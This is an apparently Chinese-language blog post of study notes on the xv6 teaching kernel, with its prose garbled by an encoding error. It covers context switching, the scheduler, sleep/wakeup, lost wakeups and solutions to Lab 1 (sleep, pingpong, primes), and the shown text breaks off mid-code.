<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">000000008000267a &lt;swtch&gt;:</span><br><span class="line">    8000267a:	00153023          	sd	ra,0(a0)</span><br><span class="line">    8000267e:	00253423          	sd	sp,8(a0)</span><br><span class="line">    80002682:	e900                	sd	s0,16(a0)</span><br><span class="line">    80002684:	ed04                	sd	s1,24(a0)</span><br><span class="line">    80002686:	03253023          	sd	s2,32(a0)</span><br><span class="line">    8000268a:	03353423          	sd	s3,40(a0)</span><br><span class="line">    8000268e:	03453823          	sd	s4,48(a0)</span><br><span class="line">    80002692:	03553c23          	sd	s5,56(a0)</span><br><span class="line">    80002696:	05653023          	sd	s6,64(a0)</span><br><span class="line">    8000269a:	05753423          	sd	s7,72(a0)</span><br><span class="line">    8000269e:	05853823          	sd	s8,80(a0)</span><br><span class="line">    800026a2:	05953c23          	sd	s9,88(a0)</span><br><span class="line">    800026a6:	07a53023          	sd	s10,96(a0)</span><br><span class="line">    800026aa:	07b53423          	sd	s11,104(a0)</span><br><span class="line">    800026ae:	0005b083          	ld	ra,0(a1)</span><br><span class="line">    800026b2:	0085b103          	ld	sp,8(a1)</span><br><span class="line">    800026b6:	6980                	ld	s0,16(a1)</span><br><span class="line">    800026b8:	6d84                	ld	s1,24(a1)</span><br><span class="line">    800026ba:	0205b903          	ld	s2,32(a1)</span><br><span class="line">    800026be:	0285b983          	ld	s3,40(a1)</span><br><span class="line">    800026c2:	0305ba03          	ld	s4,48(a1)</span><br><span class="line">    800026c6:	0385ba83          	ld	s5,56(a1)</span><br><span class="line">    800026ca:	0405bb03          	ld	s6,64(a1)</span><br><span class="line">    800026ce:	0485bb83          	ld	s7,72(a1)</span><br><span class="line">    800026d2:	0505bc03          	ld	s8,80(a1)</span><br><span class="line">    800026d6:	0585bc83          	ld	s9,88(a1)</span><br><span class="line">    800026da:	0605bd03          	ld	s10,96(a1)</span><br><span class="line">    800026de:	0685bd83          	ld	s11,104(a1)</span><br><span class="line">    800026e2:	8082                	ret</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªæ˜¯<code>scheduler</code>å‡½æ•°ï¼Œåˆ‡æ¢ä¸Šä¸‹æ–‡åï¼Œå°±ä¼šæ‰§è¡Œ<code>swtch</code>çš„ä¸‹ä¸€æ¡è¯­å¥äº†ï¼Œæ¯”è¾ƒé¥¶çš„å°±æ˜¯è·å¾—é”å’Œé‡Šæ”¾é”åº”è¯¥æ˜¯ä¸€ä¸ªè¿›ç¨‹å¹²çš„äº‹æƒ…ï¼Œä½†æ˜¯åœ¨è°ƒåº¦çš„æ—¶å€™å¹¶ä¸æ˜¯è¿™æ ·ï¼Œé¦–å…ˆåœ¨<code>yield</code>ä¸­è·å¾—é”ï¼Œç„¶ååœ¨<code>scheduler</code>é‡Šæ”¾é”ï¼Œç›®çš„ä¿æŠ¤è¿›ç¨‹ä¸è¢«å…¶ä»–cpuè°ƒåº¦ã€‚çœ‹ä¼¼å½¢ä¸æˆä¸€ä¸ªé—­ç¯ï¼Œä½†å…¶å®æ˜¯å¯ä»¥çš„ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">scheduler</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">cpu</span> *<span class="title">c</span> =</span> mycpu();</span><br><span class="line">  </span><br><span class="line">  c-&gt;proc = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">    <span class="comment">// Avoid deadlock by ensuring that devices can interrupt.</span></span><br><span class="line">    intr_on();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> nproc = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(p = proc; p &lt; &amp;proc[NPROC]; p++) &#123;</span><br><span class="line">      acquire(&amp;p-&gt;lock);</span><br><span class="line">      <span class="keyword">if</span>(p-&gt;state != UNUSED) &#123;</span><br><span class="line">        nproc++;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span>(p-&gt;state == RUNNABLE) &#123;</span><br><span class="line">        <span class="comment">// Switch to chosen process.  It is the process&#x27;s job</span></span><br><span class="line">        <span class="comment">// to release its lock and then reacquire it</span></span><br><span class="line">        <span class="comment">// before jumping back to us.</span></span><br><span class="line">        p-&gt;state = RUNNING;</span><br><span class="line">        c-&gt;proc = p;</span><br><span class="line">        swtch(&amp;c-&gt;context, &amp;p-&gt;context);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Process is done running for now.</span></span><br><span class="line">        <span class="comment">// It should have changed its p-&gt;state before coming back.</span></span><br><span class="line">        c-&gt;proc = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      release(&amp;p-&gt;lock);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(nproc &lt;= <span class="number">2</span>) &#123;   <span class="comment">// only init and sh exist</span></span><br><span class="line">      intr_on();</span><br><span class="line">      <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span><span class="params">(<span class="string">&quot;wfi&quot;</span>)</span></span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>xv6ä¸ºæ¯ä¸ªcpuå‡†å¤‡äº†ä¸€ä¸ª<code>struct cpu</code>,è¿™ä¸ªç»“æ„ä½“é‡Œå°±ä¼šè®°å½•ç€è¿™ä¸ªcpuå½“å‰è¿è¡Œçš„<code>proc</code>ç­‰ç­‰ï¼Œæ‰€æœ‰çš„<code>struct cpu</code>ä¿å­˜åœ¨ä¸€ä¸ªæ•°ç»„é‡Œï¼Œåˆ©ç”¨å½“å‰cpuçš„<code>tp</code>å¯„å­˜å™¨çš„å€¼è¿›è¡Œç´¢å¼•ã€‚</p>
<p><strong>sleep/wakeup</strong></p>
<p>ç”Ÿäº§è€…æ˜¯ä¸€ä¸ªçº¿ç¨‹ï¼Œæ¶ˆè´¹è€…æ˜¯ä¸€ä¸ªçº¿ç¨‹ï¼Œä¸¤ä¸ªçº¿ç¨‹ä¹‹é—´å¾—éœ€è¦ä¸€ä¸ªåŒæ­¥æœºåˆ¶æ¥åè°ƒï¼Œæ¯”å¦‚ç”Ÿäº§è€…ç”Ÿäº§ä¸€ä¸ªäº§å“ï¼Œæ¶ˆè´¹è€…æ‰èƒ½æ¶ˆè´¹ä¸€ä¸ª</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">semaphore</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> <span class="title">lock</span>;</span></span><br><span class="line">    <span class="keyword">int</span> count;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">V</span><span class="params">(struct semaphore* s)</span> </span>&#123;</span><br><span class="line">    acquire(&amp;s-&gt;lock);</span><br><span class="line">    s-&gt;count += <span class="number">1</span>;</span><br><span class="line">    release(&amp;s-&gt;lock);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">P</span><span class="params">(struct semaphore* s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (s-&gt;count == <span class="number">0</span>)</span><br><span class="line">        ;</span><br><span class="line">    acquire(&amp;s-&gt;lock);</span><br><span class="line">    s-&gt;count -= <span class="number">1</span>;</span><br><span class="line">    release(&amp;s-&gt;lock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªä»£ç æ²¡é—®é¢˜ï¼Œä½†æ˜¯å¯¹äºæ¶ˆè´¹è€…æ¥è¯´ï¼Œå¦‚æœç”Ÿäº§è€…æ²¡æœ‰ç”Ÿäº§çš„è¯ï¼Œé‚£å°±å¾—ä¸€ç›´è‡ªæ—‹ï¼Œååˆ†æµªè´¹cpuèµ„æºï¼Œå½“å¼•è¿›åŒæ­¥æœºåˆ¶å</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">V</span><span class="params">(struct semaphore* s)</span> </span>&#123;</span><br><span class="line">    acquire(&amp;s-&gt;lock);</span><br><span class="line">    s-&gt;count += <span class="number">1</span>;</span><br><span class="line">    wakeup(s);</span><br><span class="line">    release(&amp;s-&gt;lock);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">P</span><span class="params">(struct semaphore* s)</span> </span>&#123;</span><br><span class="line">    acquire(&amp;s-&gt;lock);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (s-&gt;count == <span class="number">0</span>)</span><br><span class="line">        sleep(s, &amp;s-&gt;lock);  <span class="comment">// !pay attention</span></span><br><span class="line">    s-&gt;count -= <span class="number">1</span>;</span><br><span class="line">    release(&amp;s-&gt;lock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·å³è€ƒè™‘äº†cpuèµ„æºè¿˜è€ƒè™‘äº†æ¡ä»¶ç«äº‰ã€‚</p>
<p><code>pipe</code>å°±æ˜¯åˆ©ç”¨é”å’Œ<code>sleep/wakeup</code>å®ç°çš„ï¼Œ<code>exit/wait</code>ä¹Ÿæ˜¯ã€‚</p>
<p>æ€»è€Œè¨€ä¹‹ï¼Œé”è¿™å—åŸç†ä¸ç»•ï¼Œä½†æ˜¯ä½¿ç”¨èµ·æ¥å¥½ç»•å•Šã€‚</p>
<h5 id="è¯¾ç¨‹å†…å®¹-1"><a href="#è¯¾ç¨‹å†…å®¹-1" class="headerlink" title="è¯¾ç¨‹å†…å®¹"></a>è¯¾ç¨‹å†…å®¹</h5><p>ä¸»è¦è®²è§£thread switch</p>
<p>ç»ˆäºçŸ¥é“äº†å®šæ—¶å™¨ä¸­æ–­æ˜¯ä¸ªä»€ä¹ˆè‘£ç†Šäº†ï¼Œæ¯ä¸ªæ ¸å¿ƒéƒ½æœ‰ä¸€ä¸ªå®šæ—¶å™¨ï¼Œè¿™ä¸ªå®šæ—¶å™¨å‘¨æœŸæ€§çš„å‘å‡ºä¸€äº›ä¸­æ–­ï¼Œè¿™äº›ä¸­æ–­å°±æ˜¯å®šæ—¶å™¨ä¸­æ–­ï¼Œæ‰€ä»¥å°±ç®—ç¨‹åºæ²¡æœ‰ä¸»åŠ¨é™·å…¥å†…æ ¸ï¼Œåœ¨å®šæ—¶å™¨å‘ç”Ÿçš„æ—¶å€™è¿˜æ˜¯ä¼šé™·å…¥ï¼Œæ­¤æ—¶å°±å¯ä»¥è®°å½•ç¨‹åºè¿è¡Œæ—¶é•¿å’Œæ˜¯å¦åˆ‡æ¢ç¨‹åºçš„å·¥ä½œäº†ã€‚</p>
<p>åœ¨å‘ç”Ÿè®¡æ—¶å™¨ä¸­æ–­çš„æ—¶å€™ï¼Œå†…æ ¸å¤„ç†ç¨‹åºå°±å¯ä»¥è®©å‡ºcpuç»™è°ƒåº¦å™¨ï¼Œç„¶åè°ƒåº¦å™¨åˆ‡æ¢çº¿ç¨‹ï¼Œåœ¨xv6ä¸­ï¼Œè®©å‡ºé çš„æ˜¯yields()å‡½æ•°ã€‚</p>
<p>è¿›ç¨‹ä¹‹é—´çš„åˆ‡æ¢å¹¶ä¸æ˜¯ä»è¿™ä¸ªè¿›ç¨‹çš„ç›´æ¥åˆ‡æ¢åˆ°å¦ä¸€ä¸ªè¿›ç¨‹çš„ï¼Œè€Œæ˜¯ä»è¿™ä¸ªè¿›ç¨‹çš„å†…æ ¸çº¿ç¨‹ï¼ˆçº¿ç¨‹1ï¼‰ä¸­åˆ‡æ¢åˆ°å¦ä¸€ä¸ªè¿›ç¨‹çš„å†…æ ¸çº¿ç¨‹ï¼ˆçº¿ç¨‹2ï¼‰ä¸­ï¼Œç„¶ååœ¨çº¿ç¨‹2ä¸­å†è‡ªç„¶è¿”å›åˆ°å¯¹åº”è¿›ç¨‹ä¸­ï¼ˆè¿›ç¨‹2ï¼‰ã€‚</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20221011154315913.png" alt="image-20221011154315913"></p>
<h4 id="Lecture13"><a href="#Lecture13" class="headerlink" title="Lecture13"></a>Lecture13</h4><p>è¿™èŠ‚è¯¾ä¸»è¦è®²è§£äº†sleepå’Œwakeupï¼Œè¿™æ˜¯ä¸€ç§å¸¸è§çš„åè°ƒæœºåˆ¶ã€‚</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20221020144559437.png" alt="image-20221020144559437"></p>
<p>å½“sleep/wakeupä¸ä½¿ç”¨é”ä½œä¸ºå‚æ•°çš„è¯å®ç°ä¼ªä»£ç å¦‚ä¸Šå›¾ï¼Œå¦‚æœä½¿ç”¨è¿™ç§sleep/wakeupçš„è¯å°±ä¼šé€ æˆä¸¥é‡çš„<code>lost wakeup</code>é—®é¢˜ï¼Œä¾‹å­å¦‚ä¸‹</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20221020150533008.png" alt="image-20221020150533008"> </p>
<p><code>uartwrite</code>é‡Šæ”¾é”ä¹‹åï¼Œä¸­æ–­çº¿ç¨‹å°±å¼€å§‹æ‰§è¡Œäº†ï¼Œå› ä¸ºæ˜¯å¤šæ ¸å¿ƒï¼Œæ‰€ä»¥å°±ä¼šé€ æˆä¸€ç§å±€é¢ï¼Œ<code>wakup</code>æ¯”<code>slepp</code>æå‰æ‰§è¡Œï¼Œå¯¼è‡´sleepçš„çº¿ç¨‹æ²¡æœ‰äººå»å”¤é†’äº†ã€‚è¿™å°±æ˜¯<code>lsot wakeup</code>ã€‚</p>
<p>æˆ‘ä»¥ä¸ºå¤„ç†åŠæ³•æ˜¯è®©é‡Šæ”¾é”å’Œç¡çœ æ˜¯åŸå­çš„å°±å¥½äº†ï¼Œä½†æ˜¯xv6å¹¶ä¸æ˜¯è¿™æ ·å®ç°çš„ï¼Œè€Œæ˜¯ä½¿ç”¨<code>p-&gt;lock</code>ï¼Œè¿™æ ·ä¹Ÿè¾¾åˆ°äº†æ•ˆæœã€‚</p>
<p>è€å¸ˆå¯¹<code>wait</code>å‡½æ•°ä¹Ÿè¿›è¡Œäº†è®²è§£ï¼Œæ‰æ˜ç™½è¿‡æ¥å…¶å®å­è¿›ç¨‹çš„èµ„æºå›æ”¶å¹¶ä¸æ˜¯ç”±å­è¿›ç¨‹è‡ªå·±å®Œæˆçš„ï¼Œè€Œæ˜¯å¯¹è‡ªå·±çŠ¶æ€è¿›è¡Œæ ‡æ³¨ä¸ºå¯ä»¥å›æ”¶ï¼Œç„¶åçˆ¶è¿›ç¨‹è°ƒç”¨wait()çš„æ—¶å€™æ£€æŸ¥å­è¿›ç¨‹ç„¶åå›æ”¶ã€‚ï¼ˆå½“ç„¶ä¸å¯èƒ½è‡ªå·±å›æ”¶è‡ªå·±ï¼‰ã€‚</p>
<h4 id="Lecture14"><a href="#Lecture14" class="headerlink" title="Lecture14"></a>Lecture14</h4><p>è¿™èŠ‚è¯¾ä¸»è¦æ˜¯æ–‡ä»¶ç³»ç»Ÿçš„è®²è§£</p>
<h2 id="LAB"><a href="#LAB" class="headerlink" title="LAB"></a>LAB</h2><h3 id="Lab1-Xv6-and-Unix-utilities"><a href="#Lab1-Xv6-and-Unix-utilities" class="headerlink" title="Lab1: Xv6 and Unix utilities"></a>Lab1: Xv6 and Unix utilities</h3><p>è¿™ä¸ªå®éªŒä¸»è¦æ˜¯ç†Ÿæ‚‰xv6çš„ç³»ç»Ÿè°ƒç”¨æ¥å£çš„ã€‚</p>
<h4 id="sleep"><a href="#sleep" class="headerlink" title="sleep"></a>sleep</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;user/user.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(argc!=<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="number">2</span>,<span class="string">&quot;your parameter is not number\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(atoi(argv[<span class="number">1</span>]));</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="pingpong"><a href="#pingpong" class="headerlink" title="pingpong"></a>pingpong</h4><p>åˆ©ç”¨pipeå®Œæˆçˆ¶å­è¿›ç¨‹ä¹‹é—´åŒå‘é€šä¿¡ï¼Œåˆšå¼€å§‹æ²¡ç†è§£é€pipe,åªç”¨äº†ä¸€ä¸ªç®¡é“ï¼Œå‘ç°æ€ä¹ˆéƒ½ä¸å¯¹ï¼Œçœ‹äº†åˆ«äººçš„ä»£ç æ‰æç„¶å¤§é›¾ï¼Œpipeåªèƒ½å®Œæˆå•å‘é€šä¿¡ï¼ŒåŒå‘è‚¯å®šå¾—è¦ä¸¤ä¸ªç®¡é“å•Š,ä¸è¿‡æˆ‘é”™è¯¯é‚£ä¸€ç‰ˆéª—è¿‡äº†labæ£€æŸ¥ç¨‹åºï¼Œä¹</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;user/user.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> rd 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> wt 1</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> p_to_child[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">int</span> p_to_parent[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">10</span>];</span><br><span class="line">    pipe(p_to_child);</span><br><span class="line">    pipe(p_to_parent);</span><br><span class="line">    <span class="keyword">int</span> pid=fork();</span><br><span class="line">    <span class="keyword">if</span>(pid&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="number">2</span>,<span class="string">&quot;fork fail\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(pid==<span class="number">0</span>)&#123;</span><br><span class="line">        close(p_to_child[wt]);</span><br><span class="line">        close(p_to_parent[rd]);</span><br><span class="line">        <span class="keyword">int</span> ret=read(p_to_child[rd],buf,<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>(ret&lt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="number">2</span>,<span class="string">&quot;read fail\n&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="number">1</span>,<span class="string">&quot;%d: received ping\n&quot;</span>,getpid());</span><br><span class="line">        ret=write(p_to_parent[wt],<span class="string">&quot;1&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>(ret&lt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="number">2</span>,<span class="string">&quot;write fail\n&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        close(p_to_child[rd]);</span><br><span class="line">        close(p_to_parent[wt]);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        close(p_to_child[rd]);</span><br><span class="line">        close(p_to_parent[wt]);</span><br><span class="line">        <span class="keyword">int</span> ret=write(p_to_child[wt],<span class="string">&quot;1&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>(ret&lt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="number">2</span>,<span class="string">&quot;write fail\n&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        ret=read(p_to_parent[rd],buf,<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>(ret&lt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="number">2</span>,<span class="string">&quot;read fail\n&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="number">1</span>,<span class="string">&quot;%d: received pong\n&quot;</span>,getpid());</span><br><span class="line">        close(p_to_child[wt]);</span><br><span class="line">        close(p_to_parent[rd]);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="primes"><a href="#primes" class="headerlink" title="primes"></a>primes</h4><p>è¿™ä¸ªç¨‹åºè¿˜æ˜¯æ¯”è¾ƒéº»çƒ¦çš„ï¼Œè¦æ±‚åˆ©ç”¨forkå’Œç®¡é“å®Œæˆå¯¹ç´ æ•°çš„ç­›é€‰ï¼Œç†è®ºå¦‚ä¸‹</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220807185230278.png" alt="image-20220807185230278"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;user/user.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> rd 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> wt 1</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun</span><span class="params">(<span class="keyword">int</span> p_rd,<span class="keyword">int</span> c_wt)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> first_num=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> temp=<span class="number">0</span>;</span><br><span class="line">    read(p_rd,&amp;first_num,<span class="number">4</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="number">1</span>,<span class="string">&quot;prime %d\n&quot;</span>,first_num);</span><br><span class="line">    <span class="keyword">int</span> num;</span><br><span class="line">    <span class="keyword">while</span>(read(p_rd,&amp;num,<span class="number">4</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(num%first_num!=<span class="number">0</span>)&#123;</span><br><span class="line">            temp++;</span><br><span class="line">            write(c_wt,&amp;num,<span class="number">4</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> p[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">int</span> c[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">int</span> status;</span><br><span class="line">    pipe(p);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;=<span class="number">35</span>;i++)&#123;</span><br><span class="line">        write(p[wt],&amp;i,<span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> pid=fork();</span><br><span class="line">        <span class="keyword">if</span>(pid==<span class="number">0</span>)&#123;</span><br><span class="line">            pipe(c);</span><br><span class="line">            close(p[wt]);</span><br><span class="line">            <span class="keyword">int</span> 